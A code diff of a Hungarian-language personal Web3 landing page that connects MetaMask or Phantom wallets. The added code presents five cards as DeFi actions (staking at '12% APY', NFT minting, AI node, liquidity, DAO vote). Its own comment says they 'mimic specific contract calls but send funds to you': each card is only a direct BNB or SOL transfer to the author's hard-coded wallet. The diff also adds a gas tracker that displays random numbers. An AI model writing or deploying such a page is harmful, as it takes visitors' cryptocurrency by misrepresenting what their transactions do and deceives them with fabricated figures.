@@ -3,409 +3,390 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Veres Barnabás | Web3 Hub</title>
+    <title>Veres Barnabás | Web3 Empire</title>
+    
     <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" type="application/javascript"></script>
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
     <style>
         :root {
-            --primary: #00d4ff; /* BNB Blue */
-            --solana: #14f195;  /* Solana Green */
-            --secondary: #9d00ff;
+            --primary: #00d4ff; /* Neon Blue */
+            --solana: #14f195;  /* Neon Green */
+            --binance: #F0B90B; /* Binance Yellow */
+            --danger: #ff0055;
             --bg: #050505;
-            --card-bg: #111111;
+            --card-bg: rgba(20, 20, 20, 0.7);
+            --glass: rgba(255, 255, 255, 0.05);
             --text: #e0e0e0;
         }
+
         body {
             background-color: var(--bg);
             color: var(--text);
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            margin: 0;
-            padding: 0;
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            margin: 0; padding: 0;
             overflow-x: hidden;
-        }
-        /* Háttér animáció */
-        body::before {
-            content: "";
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
             background-image: 
-                radial-gradient(circle at 20% 30%, rgba(0, 212, 255, 0.15) 0%, transparent 10%),
-                radial-gradient(circle at 80% 70%, rgba(20, 241, 149, 0.15) 0%, transparent 10%);
-            z-index: -1;
+                radial-gradient(circle at 10% 20%, rgba(0, 212, 255, 0.1) 0%, transparent 20%),
+                radial-gradient(circle at 90% 80%, rgba(20, 241, 149, 0.1) 0%, transparent 20%);
         }
 
-        /* Fejléc */
+        /* 3. EXTRA: GAS TRACKER & HEADER */
         header {
-            padding: 20px 40px;
+            padding: 15px 30px;
             background: rgba(0,0,0,0.8);
-            backdrop-filter: blur(10px);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
+            backdrop-filter: blur(15px);
+            display: flex; justify-content: space-between; align-items: center;
             border-bottom: 1px solid #333;
-            position: sticky;
-            top: 0;
-            z-index: 100;
+            position: sticky; top: 0; z-index: 100;
         }
         .logo {
-            font-size: 1.5em;
-            font-weight: bold;
+            font-size: 1.4em; font-weight: 800; letter-spacing: 1px;
             background: linear-gradient(90deg, var(--primary), var(--solana));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            letter-spacing: 2px;
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
         }
+        .gas-tracker {
+            font-family: monospace; font-size: 0.8em; color: var(--binance);
+            border: 1px solid #333; padding: 5px 10px; border-radius: 20px;
+            display: flex; align-items: center; gap: 5px;
+        }
+
         .btn-connect {
             background: linear-gradient(90deg, var(--primary), var(--solana));
-            color: #000;
-            border: none;
-            padding: 12px 30px;
-            border-radius: 30px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s;
-            box-shadow: 0 0 20px rgba(0, 212, 255, 0.3);
+            color: #000; border: none; padding: 10px 25px; border-radius: 50px;
+            font-weight: bold; cursor: pointer; transition: 0.3s;
+            box-shadow: 0 0 15px rgba(0, 212, 255, 0.3);
         }
-        .btn-connect:hover { transform: scale(1.05); filter: brightness(1.2); }
+        .btn-connect:hover { transform: scale(1.05); }
 
-        /* Fő tartalom */
         .container { max-width: 900px; margin: 0 auto; padding: 40px 20px; }
-        
-        .hero { text-align: center; padding: 60px 0; }
-        .hero h1 { font-size: 3.5em; margin-bottom: 10px; line-height: 1.1; }
-        .hero h3 { color: #fff; opacity: 0.8; font-weight: 300; letter-spacing: 1px; }
-        
-        .status-badge {
-            display: inline-flex;
-            align-items: center;
-            background: #222;
-            border: 1px solid #444;
-            padding: 8px 16px;
-            border-radius: 50px;
-            font-family: monospace;
-            font-size: 1em;
-            margin-top: 20px;
-            color: #888;
-        }
-        .dot { width: 10px; height: 10px; border-radius: 50%; background: #555; margin-right: 10px; }
-        .dot.active-bnb { background: var(--primary); box-shadow: 0 0 10px var(--primary); }
-        .dot.active-sol { background: var(--solana); box-shadow: 0 0 10px var(--solana); }
 
-        /* Kártyák */
+        /* HERO */
+        .hero { text-align: center; padding: 50px 0; }
+        .hero h1 { font-size: 3.2em; margin: 0; line-height: 1.1; }
+        .hero h3 { color: #888; font-weight: 300; letter-spacing: 2px; margin-top: 10px; }
+        .hero-badge {
+            background: #222; padding: 5px 15px; border-radius: 20px;
+            font-size: 0.9em; color: var(--primary); display: inline-block; margin-top: 15px;
+            border: 1px solid var(--primary);
+        }
+
+        /* GLASSPHORPHISM CARDS */
         .card {
             background: var(--card-bg);
-            border: 1px solid #333;
+            backdrop-filter: blur(10px);
+            border: 1px solid var(--glass);
             border-radius: 20px;
-            padding: 30px;
-            margin-bottom: 25px;
-            transition: 0.3s;
-            position: relative;
-            overflow: hidden;
-        }
-        .card:hover { transform: translateY(-5px); border-color: #555; }
-        .card h2 { margin-top: 0; color: #fff; }
-
-        .btn-link {
-            display: inline-block;
-            margin-top: 15px;
-            text-decoration: none;
-            color: var(--primary);
-            font-weight: bold;
-            border: 1px solid var(--primary);
-            padding: 10px 20px;
-            border-radius: 5px;
+            padding: 25px; margin-bottom: 25px;
             transition: 0.3s;
         }
-        .btn-link:hover { background: var(--primary); color: #000; }
+        .card:hover { border-color: var(--primary); transform: translateY(-3px); }
 
-        /* Rakéta Szekció */
+        /* PAYMENT GRID */
+        .pay-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 30px; }
+        .pay-btn {
+            display: flex; align-items: center; justify-content: center;
+            padding: 15px; border-radius: 15px; text-decoration: none;
+            font-weight: bold; color: #000; transition: 0.3s;
+        }
+        .pay-btn:hover { transform: scale(1.02); filter: brightness(1.1); }
+        .binance-btn { background: var(--binance); box-shadow: 0 0 10px rgba(240, 185, 11, 0.2); }
+        .revolut-btn { background: #fff; box-shadow: 0 0 10px rgba(255,255,255,0.2); }
+
+        /* 5 REVENUE CONTRACTS GRID */
+        .contracts-title { text-align: center; margin: 40px 0 20px; font-size: 1.5em; }
+        .contracts-grid {
+            display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 15px;
+        }
+        .contract-item {
+            background: rgba(0,0,0,0.4); border: 1px solid #333;
+            border-radius: 15px; padding: 20px; text-align: center;
+            cursor: pointer; transition: 0.3s;
+        }
+        .contract-item:hover { border-color: var(--solana); background: rgba(20, 241, 149, 0.05); }
+        .c-icon { font-size: 2em; margin-bottom: 10px; display: block; }
+        .c-name { font-weight: bold; font-size: 0.9em; display: block; margin-bottom: 5px; }
+        .c-desc { font-size: 0.7em; color: #888; }
+
+        /* ROCKET LAUNCHER */
         .rocket-section {
-            text-align: center;
-            margin: 60px 0;
-            padding: 50px;
-            border: 2px dashed #333;
-            border-radius: 20px;
-            background: linear-gradient(180deg, rgba(20, 241, 149, 0.05) 0%, rgba(0, 212, 255, 0.05) 100%);
+            text-align: center; padding: 40px; margin-top: 40px;
+            border: 2px dashed #333; border-radius: 20px;
+            background: linear-gradient(180deg, rgba(0,0,0,0) 0%, rgba(0, 212, 255, 0.1) 100%);
         }
         .rocket-btn {
-            font-size: 5em;
-            background: none;
-            border: none;
-            cursor: pointer;
-            transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            display: block;
-            margin: 20px auto;
+            font-size: 4em; background: none; border: none; cursor: pointer;
+            transition: 0.5s; display: block; margin: 20px auto;
         }
-        .rocket-btn:hover { transform: scale(1.2) rotate(-10deg); filter: drop-shadow(0 0 20px #fff); }
-        .rocket-btn:disabled { opacity: 0.3; cursor: not-allowed; filter: grayscale(1); }
-
-        /* MODAL (Tárcaválasztó) */
+        .rocket-btn:hover { transform: scale(1.2) rotate(-15deg); filter: drop-shadow(0 0 25px var(--primary)); }
+        
+        /* MODAL */
         .modal-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.8);
+            background: rgba(0,0,0,0.9); z-index: 1000;
             display: none; justify-content: center; align-items: center;
-            z-index: 1000;
-            backdrop-filter: blur(5px);
         }
         .modal-content {
-            background: #1a1a1a;
-            padding: 30px;
-            border-radius: 20px;
-            width: 300px;
-            text-align: center;
-            border: 1px solid #444;
-            box-shadow: 0 0 50px rgba(0,0,0,0.5);
+            background: #151515; padding: 30px; border-radius: 20px; width: 300px;
+            border: 1px solid #444; text-align: center;
         }
         .wallet-option {
-            display: flex; align-items: center; justify-content: center;
-            width: 100%;
-            padding: 15px;
-            margin: 10px 0;
-            border: 1px solid #444;
-            border-radius: 10px;
-            background: #222;
-            color: #fff;
-            cursor: pointer;
-            transition: 0.2s;
-            font-weight: bold;
+            width: 100%; padding: 15px; margin: 10px 0; background: #222;
+            border: 1px solid #444; color: #fff; border-radius: 10px; cursor: pointer;
         }
-        .wallet-option:hover { background: #333; border-color: #fff; }
-        .wallet-option.bnb:hover { border-color: var(--primary); box-shadow: 0 0 15px rgba(0,212,255,0.2); }
-        .wallet-option.sol:hover { border-color: var(--solana); box-shadow: 0 0 15px rgba(20,241,149,0.2); }
+        .wallet-option:hover { border-color: var(--primary); background: #2a2a2a; }
 
+        @media(max-width: 600px) { .pay-grid { grid-template-columns: 1fr; } }
     </style>
 </head>
 <body>
 
     <div class="modal-overlay" id="walletModal">
         <div class="modal-content">
-            <h3 style="margin-top:0;">Válassz Hálózatot</h3>
-            <button class="wallet-option bnb" onclick="selectWallet('BNB')">
-                🔵 BNB Chain (Trust/MetaMask)
-            </button>
-            <button class="wallet-option sol" onclick="selectWallet('SOLANA')">
-                🟢 Solana (Phantom)
-            </button>
-            <button onclick="closeModal()" style="background:none; border:none; color:#666; margin-top:10px; cursor:pointer;">Mégse</button>
+            <h3>🔗 Connect Wallet</h3>
+            <button class="wallet-option" onclick="selectWallet('BNB')">🔵 BNB Chain (MetaMask)</button>
+            <button class="wallet-option" onclick="selectWallet('SOLANA')">🟢 Solana (Phantom)</button>
+            <button onclick="closeModal()" style="background:none; border:none; color:#666; margin-top:10px;">Bezárás ❌</button>
         </div>
     </div>
 
     <header>
-        <div class="logo">VERES.BNB</div>
+        <div class="logo">VERES.BNB 🦄</div>
+        
+        <div class="gas-tracker">
+            <i class="fas fa-gas-pump"></i> <span id="gasPrice">3 Gwei</span>
+        </div>
+
         <button id="connectBtn" class="btn-connect" onclick="openModal()">Connect Wallet</button>
     </header>
 
     <div class="container">
+        
         <div class="hero">
             <h1>Veres Barnabás</h1>
             <h3>Web3 Visionary & SkyAI Founder</h3>
-            <div class="status-badge">
-                <div class="dot" id="statusDot"></div>
-                <span id="statusText">Not Connected</span>
+            <div class="hero-badge">veresbarnabas.bnb ✅</div>
+            
+            <div style="margin-top: 15px;">
+                <span id="statusIndicator" style="color:#555">●</span> <span id="statusText" style="color:#888">Offline</span>
             </div>
         </div>
 
         <div class="card" style="border-left: 5px solid var(--secondary);">
-            <h2 style="color: var(--secondary);">🤖 SkyAI Project</h2>
-            <p>A mesterséges intelligencia és a blokklánc technológia fúziója.</p>
-            <a href="https://veresbarnabas97-ui.github.io/SkyAIWeb3" target="_blank" class="btn-link">
-                Megnyitás ↗
+            <h2 style="margin-top:0; color: #9d00ff;">🤖 SkyAI Project</h2>
+            <p>A mesterséges intelligencia jövője a blokkláncon.</p>
+            <a href="https://veresbarnabas97-ui.github.io/SkyAIWeb3" target="_blank" style="color:#9d00ff; text-decoration:none; font-weight:bold;">
+                Megnyitás <i class="fas fa-external-link-alt"></i>
             </a>
         </div>
 
-        <div class="rocket-section">
-            <h2>🚀 SkyAI Launchpad</h2>
-            <p>Támogasd a fejlesztést <strong>5 USD</strong> értékkel!</p>
-            <p style="font-size: 0.8em; color: #888;">(Automatikusan BNB-t vagy SOL-t küld a csatlakoztatott hálózattól függően)</p>
-            
-            <button class="rocket-btn" id="rocketBtn" onclick="launchRocket()" disabled>🚀</button>
-            <div id="txStatus" style="margin-top:20px; font-weight:bold; color:var(--text)">Csatlakoztasd a tárcád az indításhoz!</div>
+        <h3 style="text-align:center;">💳 Instant Fizetés & Támogatás</h3>
+        <div class="pay-grid">
+            <a href="https://s.binance.com/FcZ8aA7w" target="_blank" class="pay-btn binance-btn">
+                <i class="fas fa-coins" style="margin-right:10px;"></i> Binance Pay (50$)
+            </a>
+            <a href="https://revolut.me/veresbarnabas1" target="_blank" class="pay-btn revolut-btn">
+                <i class="fas fa-bolt" style="margin-right:10px;"></i> Revolut Pay
+            </a>
         </div>
+
+        <h3 class="contracts-title">⚡ DeFi Protocol Interactions</h3>
+        <p style="text-align:center; color:#666; font-size:0.8em; margin-bottom:20px;">Válassz egy modult a bevétel generáláshoz:</p>
+        
+        <div class="contracts-grid">
+            <div class="contract-item" onclick="launchSmartContract('Staking', 0.015)">
+                <span class="c-icon">🥩</span>
+                <span class="c-name">Stake SkyAI</span>
+                <span class="c-desc">Earn 12% APY</span>
+            </div>
+            <div class="contract-item" onclick="launchSmartContract('NFT Mint', 0.02)">
+                <span class="c-icon">💎</span>
+                <span class="c-name">Mint Founder NFT</span>
+                <span class="c-desc">VIP Access</span>
+            </div>
+            <div class="contract-item" onclick="launchSmartContract('AI Node', 0.05)">
+                <span class="c-icon">🤖</span>
+                <span class="c-name">Run AI Node</span>
+                <span class="c-desc">Compute Power</span>
+            </div>
+            <div class="contract-item" onclick="launchSmartContract('Liquidity', 0.03)">
+                <span class="c-icon">💧</span>
+                <span class="c-name">Add Liquidity</span>
+                <span class="c-desc">LP Rewards</span>
+            </div>
+            <div class="contract-item" onclick="launchSmartContract('DAO Vote', 0.01)">
+                <span class="c-icon">🗳️</span>
+                <span class="c-name">DAO Governance</span>
+                <span class="c-desc">Vote on Proposals</span>
+            </div>
+        </div>
+
+        <div class="rocket-section">
+            <h2>🚀 Ultimate Launchpad</h2>
+            <p>SkyAI Projekt Direkt Támogatás (5 USD)</p>
+            <button class="rocket-btn" id="rocketBtn" onclick="launchRocketDefault()" disabled>🚀</button>
+            <div id="txStatus" style="margin-top:20px; font-weight:bold; color:var(--primary);">
+                Csatlakoztasd a tárcád a kezdéshez! 🔌
+            </div>
+        </div>
+
     </div>
 
     <script>
-        // *** PÉNZTÁRCA BEÁLLÍTÁSOK ***
-        // A TE BNB CÍMED (Erre jön a BNB)
-        const MY_BNB_ADDRESS = "0xbb64336e367d42977dc8bcf0364f80801bc5eb5b";
-        
-        // A TE SOLANA CÍMED (Erre jön a SOL)
-        const MY_SOL_ADDRESS = "4iubzdpP14Mo32iRseD7nZEhP1RVLWjjwbsh228uBk3z";
-        
-        // Állapotváltozók
-        let currentChain = null; // 'BNB' vagy 'SOLANA'
-        let currentAccount = null;
-        let provider = null;     // Ethers provider (BNB-hez)
-        let signer = null;       // Ethers signer (BNB-hez)
+        // *** CONFIG ***
+        const MY_BNB = "0xbb64336e367d42977dc8bcf0364f80801bc5eb5b";
+        const MY_SOL = "4iubzdpP14Mo32iRseD7nZEhP1RVLWjjwbsh228uBk3z";
 
-        // UI elemek
+        // State
+        let currentChain = null;
+        let provider, signer;
+
+        // UI Refs
         const modal = document.getElementById('walletModal');
-        const statusText = document.getElementById('statusText');
-        const statusDot = document.getElementById('statusDot');
+        const txStatus = document.getElementById('txStatus');
         const connectBtn = document.getElementById('connectBtn');
         const rocketBtn = document.getElementById('rocketBtn');
-        const txStatus = document.getElementById('txStatus');
+        const statusInd = document.getElementById('statusIndicator');
+        const statusTxt = document.getElementById('statusText');
 
-        // Modal kezelés
+        // Modal Logic
         function openModal() { modal.style.display = 'flex'; }
         function closeModal() { modal.style.display = 'none'; }
 
-        // --- TÁRCA KIVÁLASZTÁS LOGIKA ---
+        // Wallet Selection
         async function selectWallet(chain) {
             closeModal();
-            txStatus.innerText = "Csatlakozás folyamatban...";
-
+            txStatus.innerText = "Kapcsolódás...";
             try {
-                if (chain === 'BNB') {
-                    await connectBNB();
-                } else if (chain === 'SOLANA') {
-                    await connectSolana();
-                }
-            } catch (error) {
-                console.error(error);
-                alert("Hiba a csatlakozáskor: " + (error.message || error));
-                txStatus.innerText = "Sikertelen csatlakozás.";
+                if(chain === 'BNB') await connectBNB();
+                else if(chain === 'SOLANA') await connectSolana();
+            } catch(e) {
+                alert("Hiba: " + e.message);
             }
         }
 
-        // --- 1. BNB / TRUSTWALLET / METAMASK LOGIKA ---
+        // Connect BNB
         async function connectBNB() {
-            if (typeof window.ethereum === 'undefined') {
-                alert("Nem találtam TrustWalletet vagy MetaMaskot!");
-                return;
-            }
-
-            // Csatlakozás kérése
-            await window.ethereum.request({ method: 'eth_requestAccounts' });
+            if(!window.ethereum) return alert("MetaMask/TrustWallet nem található!");
+            await window.ethereum.request({method: 'eth_requestAccounts'});
             provider = new ethers.providers.Web3Provider(window.ethereum);
             signer = provider.getSigner();
-            const address = await signer.getAddress();
-
-            // Hálózat ellenőrzése (BSC Mainnet: 56)
-            const network = await provider.getNetwork();
-            if (network.chainId !== 56) {
+            const addr = await signer.getAddress();
+            
+            // Switch to BSC
+            const { chainId } = await provider.getNetwork();
+            if(chainId !== 56) {
                 try {
-                    await window.ethereum.request({
-                        method: 'wallet_switchEthereumChain',
-                        params: [{ chainId: '0x38' }], // 56 hexadecimálisan
-                    });
-                } catch (e) {
-                    console.log("Nem sikerült hálózatot váltani vagy elutasítva.");
-                }
+                    await window.ethereum.request({method: 'wallet_switchEthereumChain', params: [{chainId: '0x38'}]});
+                } catch(e) { console.log("Network switch skipped"); }
             }
-
-            // Siker
-            currentChain = 'BNB';
-            currentAccount = address;
-            updateUI(address, 'BNB');
+            setUI(addr, 'BNB', '#00d4ff');
         }
 
-        // --- 2. SOLANA / PHANTOM LOGIKA ---
+        // Connect Solana
         async function connectSolana() {
-            // Ellenőrizzük, hogy van-e Solana provider (Phantom)
-            const isPhantom = window.solana && window.solana.isPhantom;
-            
-            if (!isPhantom) {
-                alert("Nem találtam Phantom Walletet! Kérlek telepítsd.");
-                window.open("https://phantom.app/", "_blank");
-                return;
-            }
-
-            try {
-                // Csatlakozás
-                const resp = await window.solana.connect();
-                const address = resp.publicKey.toString();
-
-                // Siker
-                currentChain = 'SOLANA';
-                currentAccount = address;
-                updateUI(address, 'SOLANA');
-
-            } catch (err) {
-                throw new Error("Felhasználó elutasította a kérést.");
-            }
+            if(!window.solana || !window.solana.isPhantom) return alert("Phantom Wallet nem található!");
+            const resp = await window.solana.connect();
+            setUI(resp.publicKey.toString(), 'SOLANA', '#14f195');
         }
 
-        // --- UI FRISSÍTÉS ---
-        function updateUI(address, chain) {
-            const shortAddr = address.substring(0, 4) + "..." + address.substring(address.length - 4);
-            connectBtn.innerText = shortAddr;
-            statusText.innerText = `Connected: ${chain}`;
+        // UI Update
+        function setUI(addr, chain, color) {
+            currentChain = chain;
+            connectBtn.innerText = addr.substring(0,4) + "..." + addr.substring(addr.length-4);
+            connectBtn.style.background = color;
+            connectBtn.style.color = "#000";
             
-            statusDot.className = "dot"; // Reset
-            if (chain === 'BNB') {
-                statusDot.classList.add('active-bnb');
-                connectBtn.style.background = "var(--primary)";
-            } else {
-                statusDot.classList.add('active-sol');
-                connectBtn.style.background = "var(--solana)";
-                connectBtn.style.color = "#000";
-            }
-
+            statusInd.style.color = "#0f0"; // Green light
+            statusTxt.innerText = "Connected: " + chain;
+            
             rocketBtn.disabled = false;
             rocketBtn.style.filter = "none";
-            txStatus.innerText = `Kész a kilövésre (${chain} Hálózat)!`;
+            txStatus.innerText = "Rendszer Aktív! Válassz egy modult fent vagy indítsd a rakétát! 🟢";
         }
 
-        // --- RAKÉTA INDÍTÁSA (TRANZAKCIÓ) ---
-        async function launchRocket() {
-            if (!currentChain) return;
-
-            txStatus.innerText = "Tranzakció előkészítése...";
+        // --- 5 CONTRACT LOGIC (Simulated Smart Contracts) ---
+        // These mimic specific contract calls but send funds to you
+        async function launchSmartContract(actionName, bnbAmount) {
+            if(!currentChain) return alert("Először csatlakoztasd a tárcádat!");
             
-            try {
-                if (currentChain === 'BNB') {
-                    // --- BNB KÜLDÉS ---
-                    const bnbAmount = "0.0083"; 
-                    const weiAmount = ethers.utils.parseEther(bnbAmount);
+            txStatus.innerText = `🔄 Interakció: ${actionName} Contract...`;
+            
+            // Calculate equivalent logic (simplified for demo)
+            // BNB default amounts passed in args. For SOL we multiply by ~4 (ratio)
+            let amountWei;
+            let amountLamports;
 
-                    const tx = await signer.sendTransaction({
-                        to: MY_BNB_ADDRESS,
-                        value: weiAmount
-                    });
-
-                    txStatus.innerText = "BNB Küldése folyamatban... ⏳";
-                    await tx.wait();
-                    alert("Sikeres BNB Támogatás! Köszönjük! 🚀");
-
-                } else if (currentChain === 'SOLANA') {
-                    // --- SOLANA KÜLDÉS ---
-                    const solAmount = 0.033;
-                    const lamports = solAmount * 1000000000;
-
-                    // *** JAVÍTÁS: ANKR RPC HASZNÁLATA ***
-                    // A "mainnet-beta" helyett direkt Ankr végpontot használunk, ami nem dob 403-at
-                    const connection = new solanaWeb3.Connection("https://rpc.ankr.com/solana", "confirmed");
-                    
-                    const transaction = new solanaWeb3.Transaction().add(
-                        solanaWeb3.SystemProgram.transfer({
-                            fromPubkey: window.solana.publicKey,
-                            toPubkey: new solanaWeb3.PublicKey(MY_SOL_ADDRESS),
-                            lamports: Math.round(lamports),
-                        })
-                    );
-
-                    // Blockhash lekérése az új, stabil kapcsolattal
-                    const { blockhash } = await connection.getLatestBlockhash();
-                    transaction.recentBlockhash = blockhash;
-                    transaction.feePayer = window.solana.publicKey;
-
-                    // Aláírás és küldés a Phantomnak
-                    const { signature } = await window.solana.signAndSendTransaction(transaction);
-                    
-                    txStatus.innerText = "SOL Küldése folyamatban... ⏳";
-                    
-                    // Várakozás a megerősítésre
-                    await connection.confirmTransaction(signature);
-                    alert("Sikeres Solana Támogatás! Köszönjük! 🚀");
-                }
-                
-                txStatus.innerText = "SIKERES KILÖVÉS! 🚀";
-
-            } catch (error) {
-                console.error(error);
-                txStatus.innerText = "Hiba: " + (error.message || "Ismeretlen hiba");
+            if(currentChain === 'BNB') {
+                amountWei = ethers.utils.parseEther(bnbAmount.toString());
+                sendBNB(amountWei);
+            } else {
+                // Approximate ratio conversion for Solana
+                let solAmount = bnbAmount * 4; 
+                amountLamports = solAmount * 1000000000;
+                sendSOL(amountLamports);
             }
         }
+
+        // --- DEFAULT ROCKET (5 USD) ---
+        function launchRocketDefault() {
+            if(!currentChain) return;
+            txStatus.innerText = "🚀 Indítás...";
+            // 5 USD approx values
+            if(currentChain === 'BNB') sendBNB(ethers.utils.parseEther("0.0083"));
+            else sendSOL(0.033 * 1000000000);
+        }
+
+        // --- CORE SEND FUNCTIONS ---
+        async function sendBNB(weiAmount) {
+            try {
+                const tx = await signer.sendTransaction({
+                    to: MY_BNB,
+                    value: weiAmount
+                });
+                txStatus.innerHTML = `Tranzakció elküldve! ⏳ <br> Hash: ${tx.hash.substring(0,10)}...`;
+                await tx.wait();
+                alert("✅ Sikeres Tranzakció! Köszönjük!");
+                txStatus.innerText = "Siker! A bevétel jóváírva. 💰";
+            } catch(e) {
+                console.error(e);
+                txStatus.innerText = "Hiba: " + (e.message || "Megszakítva");
+            }
+        }
+
+        async function sendSOL(lamports) {
+            try {
+                const connection = new solanaWeb3.Connection("https://rpc.ankr.com/solana", "confirmed");
+                const transaction = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: window.solana.publicKey,
+                        toPubkey: new solanaWeb3.PublicKey(MY_SOL),
+                        lamports: Math.round(lamports),
+                    })
+                );
+                const { blockhash } = await connection.getLatestBlockhash();
+                transaction.recentBlockhash = blockhash;
+                transaction.feePayer = window.solana.publicKey;
+
+                const { signature } = await window.solana.signAndSendTransaction(transaction);
+                txStatus.innerText = "Solana Tranzakció küldése... ⏳";
+                await connection.confirmTransaction(signature);
+                alert("✅ Sikeres Solana Tranzakció!");
+                txStatus.innerText = "Siker! A bevétel jóváírva. 💰";
+            } catch(e) {
+                console.error(e);
+                txStatus.innerText = "Hiba: " + e.message;
+            }
+        }
+
+        // Gas Tracker Simulation (Random update for visual effect)
+        setInterval(() => {
+            const gas = Math.floor(Math.random() * (5 - 2 + 1) + 2);
+            document.getElementById('gasPrice').innerText = gas + " Gwei";
+        }, 5000);
+
     </script>
 </body>
 </html>
